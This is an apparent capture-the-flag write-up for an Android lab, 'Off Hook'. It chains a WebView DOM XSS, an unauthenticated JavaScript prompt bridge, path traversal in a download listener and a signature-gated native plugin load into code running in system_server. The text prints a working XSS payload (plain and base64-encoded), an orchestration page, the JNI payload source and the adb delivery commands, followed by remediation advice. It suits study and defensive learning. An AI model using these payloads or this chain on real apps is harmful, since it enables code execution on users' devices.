---
title: "MHL Off Hook Writeup"
date: 2026-10-27
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, webview, xss, javascript-interface, path-traversal, jni, native, telecom, system-server, rce]
---

**Platform:** Mobile Hacking Lab
**Target:** com.mobilehackinglab.members (pivot: com.mobilehackinglab.dialer)
**Category:** Android, WebView, XSS, Path Traversal, JNI, Telecom
**Outcome:** Native code execution that reaches system_server (uid 1000) and reads `/data/system/ctf_flag`, driven entirely from content loaded in a WebView

## Summary

Off Hook ships two apps that trust each other more than they should. A **Members** app has a rewards WebView with a DOM XSS sink and an unauthenticated JavaScript bridge. A **Dialer** app loads native plugins and can be reached only by Members, because the two apps share a signing key and the entry activities are guarded by a `signature`-level permission that Members holds.

Chaining it together: XSS in the rewards WebView reaches the bridge, the bridge navigates to an attacker page, that page abuses an unsanitized download filename to drop an attacker `.so` into the app's FileProvider root through path traversal, hands it to the dialer's import activity, and activates it. The dialer's `System.load` runs the attacker's `JNI_OnLoad`, which calls a method that drives Android Telecom so that **system_server** instantiates the dialer's `appComponentFactory`, runs it as uid 1000, and logs the flag.

- **Flag:** `MHL{t3lecom_tr1gger_s3rv3d}`

## Recon

Decompiled both APKs with jadx and read the two manifests plus the activities they expose.

The dialer exports its plugin entry points but guards them with a signature permission:

```xml
<permission
    android:name="com.mobilehackinglab.dialer.permission.MANAGE_PLUGINS"
    android:protectionLevel="signature"/>
<activity android:name=".ImportPluginActivity"   android:exported="true"
    android:permission="com.mobilehackinglab.dialer.permission.MANAGE_PLUGINS"/>
<activity android:name=".ActivatePluginActivity" android:exported="true"
    android:permission="com.mobilehackinglab.dialer.permission.MANAGE_PLUGINS"/>
```

`protectionLevel="signature"` means only an app signed with the same key is granted the permission. A third party app cannot call these activities. The Members app declares `uses-permission` for `MANAGE_PLUGINS` and is signed with the same key, so Members is the only door into the dialer. That is the "apps trust each other too much" objective.

The dialer also declares an `appComponentFactory` and an `InCallService`, which matter at the end:

```xml
<application android:name=".DialerApplication" android:appComponentFactory=".EffectFactory">
    <service android:name=".CallEffectService"
        android:permission="android.permission.BIND_INCALL_SERVICE">
        <intent-filter><action android:name="android.telecom.InCallService"/></intent-filter>
        <meta-data android:name="android.telecom.CLASS_EXISTENCE_CHECK" .../>
    </service>
</application>
```

On the Members side, `RewardsActivity` hosts a WebView with JavaScript enabled, loads `file:///android_asset/index.html`, and installs a `WebChromeClient` whose `onJsPrompt` ignores the origin and treats the prompt string as a command:

```java
// RewardsActivity.onJsPrompt, paraphrased
if (msg.startsWith("nav:"))        view.loadUrl(msg.removePrefix("nav:"));
else if (msg.startsWith("share:"))    launchImport(msg.removePrefix("share:"));
else if (msg.startsWith("activate:")) launchActivation(msg.removePrefix("activate:"));
```

- `nav:` navigates the WebView anywhere, through an app-initiated `loadUrl`.
- `share:` builds `content://com.mobilehackinglab.members.provider/<path>` and fires it at the dialer's `ImportPluginActivity`.
- `activate:` fires `ActivatePluginActivity` with the plugin name.

Everything downstream is reachable from a single `prompt()` call. The asset page supplies the way to make one.

## Vulnerability 1: DOM XSS in the rewards search box

`assets/index.html` writes the search field straight into `innerHTML`:

```js
// assets/index.html
results.innerHTML = 'Results for: ' + search.value;   // DOM XSS sink
```

`innerHTML` does not execute injected `<script>`, but it does run inline event handlers on injected elements. A broken image with an `onerror` handler fires JavaScript:

```html
<img src=x onerror="prompt('nav:...')">
```

Because `onJsPrompt` has no origin check, that JavaScript, from any origin the WebView later loads, owns the `nav:` / `share:` / `activate:` bridge.

## Vulnerability 2: Path traversal in the reward download

`UnsafeRewardsDownloadListener` takes the filename from either a `Content-Disposition` header or a `?filename=` query parameter, decodes it, and joins it onto the cache directory with no validation:

```java
String name = extractFilename(contentDisposition, url);  // attacker controlled
File dir  = new File(getCacheDir(), "rewards-downloads");
File out  = new File(dir, Uri.decode(name));             // no sanitization
```

The FileProvider serves exactly one root, `files/shared/`, from `file_paths.xml`:

```xml
<files-path name="shared" path="shared/"/>
```

The download lands in `cache/rewards-downloads/`. Two levels up is the app data root, so a filename of `../../files/shared/payload.so` resolves straight into the provider root, and the listener even calls `parentFile.mkdirs()`, so the directory is created for us. Serving the file as `application/octet-stream` is enough to make the WebView treat the response as a download, so a stock Python server with no custom headers works and the query parameter carries the traversal.

## Vulnerability 3: Over-trusted cross-app plugin import and load

`ImportPluginActivity` opens the provider URI and copies it into the dialer's own `files/plugins/`, checking only that the name is a bare filename ending in `.so`:

```java
// name must equal File(name).getName() and end with ".so"
File out = new File(new File(getFilesDir(), "plugins"), name);
copy(getContentResolver().openInputStream(data), new FileOutputStream(out));
```

`ActivatePluginActivity` then loads it:

```java
File f = new File(new File(getFilesDir(), "plugins"), pluginName);
f.setReadOnly();
System.load(f.getAbsolutePath());
```

Because Members is signed with the dialer's key and holds `MANAGE_PLUGINS`, both calls succeed. An app boundary that looks like a wall is, in practice, wide open to its sibling, and the sibling has an XSS.

## Vulnerability 4: appComponentFactory executes in system_server

The dialer's `EffectFactory` is its declared `appComponentFactory`. Whenever something instantiates a component of the dialer, the platform runs this factory in whatever process is doing the instantiation. It reads the flag, but only when it finds itself running as uid 1000:

```java
// EffectFactory.instantiateClassLoader
if (Process.myUid() == 1000) {
    Log.i("CTF_EFFECT", File("/data/system/ctf_flag").readText().trim());
}
```

`Exploit.trigger()` (a static method already present in the dialer) registers a transactional `PhoneAccount` with capability `262144` (`CAPABILITY_SUPPORTS_TRANSACTIONAL_OPERATIONS`) and calls `addCall`. To bind the dialer's `InCallService`, Telecom's `InCallController`, which runs inside **system_server**, checks that the service class exists. It does that by building the dialer's classloader, which instantiates the dialer's `appComponentFactory` inside system_server. That runs `EffectFactory` as uid 1000, the check passes, and the flag is logged. We only need native code in the dialer to call `trigger()`; Telecom carries the rest into the system process.

## Exploitation

### Step 1: Host the payload and the orchestration page

Two files are served from a local directory: the attacker `payload.so`, and `exploit.html`, which drives the three bridge verbs once the WebView lands on it.

```bash
# in the directory holding payload.so and exploit.html
python3 -m http.server 8888
adb reverse tcp:8888 tcp:8888    # device 127.0.0.1:8888 -> host
```

The device reaches the server over the reverse tunnel, so `127.0.0.1:8888` on the device maps back to the host.

`exploit.html` triggers the reward download with the traversal filename, waits for it to land, then imports and activates:

```html
<script>
  var DL = "http://127.0.0.1:8888/payload.so?filename=../../files/shared/payload.so";
  function p(m){ try { prompt(m); } catch(e){} }

  // 1. download payload.so into members' files/shared/ via traversal
  window.location.href = DL;
  // 2. provider serves it; dialer imports to files/plugins/
  setTimeout(function(){ p("share:shared/payload.so"); }, 4000);
  // 3. dialer System.load()s it -> JNI_OnLoad -> Exploit.trigger()
  setTimeout(function(){ p("activate:payload.so"); }, 8000);
</script>
```

### Step 2: The native plugin

The dialer never calls into the library, so all of the work happens in `JNI_OnLoad`, which the runtime invokes on load. Everything goes through the `JNIEnv` table, so the whole payload is a few lines:

```c
// payload.c
jint JNI_OnLoad(JavaVM *vm, void *reserved){
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void**)&env, JNI_VERSION_1_6);
    jclass cls  = (*env)->FindClass(env, "com/mobilehackinglab/dialer/Exploit");
    jmethodID t = (*env)->GetStaticMethodID(env, cls, "trigger", "()V");
    (*env)->CallStaticVoidMethod(env, cls, t);   // drive Telecom
    return JNI_VERSION_1_6;
}
```

`FindClass` resolves the dialer's own classes because `System.load` runs on an app thread with the dialer classloader on the stack. The lab device is `arm64-v8a`, and a wrong-architecture ELF makes `System.load` fail quietly, so the library is built for that ABI with the NDK's clang:

```bash
$ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang \
    -shared -fPIC -o payload.so payload.c
```

### Step 3: Deliver the XSS over adb

The payload is one injected tag that navigates the WebView to `exploit.html`:

```html
<img src=x onerror="prompt('nav:http://127.0.0.1:8888/exploit.html')">
```

Typing that into the search box over adb is fragile, because the device shell re-parses quotes and parentheses before `input` ever sees them. Base64 sidesteps both the host and the device shell, and toybox decodes it on the device. Tap the search field first, then:

```bash
adb shell 'input text "$(echo PGltZyBzcmM9eCBvbmVycm9yPSJwcm9tcHQoJ25hdjpodHRwOi8vMTI3LjAuMC4xOjg4ODgvZXhwbG9pdC5odG1sJykiPg== | base64 -d)"'
adb shell input keyevent 66    # submit the search
```

The search re-renders, `onerror` fires, the WebView navigates to `exploit.html`, and the three verbs run on their timers.

### Step 4: Verify

Watching the relevant tags:

```bash
adb logcat -s MembersLab DialerImport DialerActivate DialerExploit CTF_EFFECT
```

![flag](/assets/img/posts/mhl-off-hook/flag.png)

```
DialerActivate: Loading sealed plugin .../files/plugins/payload.so
CTF_EFFECT:     JNI_OnLoad: in dialer, calling Exploit.trigger()
DialerExploit:  Telecom trigger requested by loaded plugin
CTF_EFFECT:     Exploit.trigger() returned
640  CTF_EFFECT: MHL{t3lecom_tr1gger_s3rv3d}     <- PID 640 is system_server
DialerExploit:  addCall outcome=android.telecom.CallControl@...
```

The last `CTF_EFFECT` line comes from PID 640, system_server, which is the dialer's `EffectFactory` running as uid 1000 and reading `/data/system/ctf_flag`.

## Root causes

| Layer | Issue |
|---|---|
| Rendering | `innerHTML` used on content built from unescaped user input |
| WebView bridge | `onJsPrompt` acts as an RPC interface with no origin check, exposing navigation, cross-app import, and native load to page JavaScript |
| Download handling | Filename from a header or query parameter joined onto a path with no canonicalization, allowing traversal into the FileProvider root |
| App trust | A shared signing key turns a `signature` permission into "any component in the sibling app", and that app has an XSS |
| Native load | `System.load` of an imported file runs attacker `JNI_OnLoad` in the dialer process |
| Platform | `appComponentFactory` runs the app's code in whatever process instantiates its components, and system_server does so during an `InCallService` existence check |

## Remediation

- **Escape before rendering.** Use `textContent` for untrusted content, or escape HTML entities before writing to `innerHTML`.
- **Put an origin and scheme check on the bridge.** `onJsPrompt` should verify the calling page's origin and reject the command verbs for anything but the trusted asset page. Loading `file:///android_asset` content and refusing navigation to other origins would remove the pivot entirely.
- **Canonicalize download filenames.** Reduce to a base name and reject path separators and `..` before touching the filesystem.
- **Do not treat a sibling app as trusted.** Validate the content of an imported plugin, and do not expose a raw `System.load` of a caller-supplied file across an IPC boundary, even a signature-gated one.
- **Scope the appComponentFactory.** A factory that reads privileged files based only on `Process.myUid()` will do so in any process that loads the component, including system_server.

## Chain recap

1. DOM XSS in the rewards search box runs JavaScript in the WebView.
2. The unauthenticated `onJsPrompt` bridge navigates to the attacker's `exploit.html`.
3. The reward download listener writes the attacker `.so` into the FileProvider root through a `../../files/shared/` traversal.
4. `share:` imports it into the dialer across the signature-gated, same-key app boundary.
5. `activate:` calls `System.load`, running the attacker's `JNI_OnLoad`, which calls `Exploit.trigger()`.
6. `trigger()` drives Telecom, so system_server instantiates the dialer's `appComponentFactory`, runs it as uid 1000, and logs the flag.

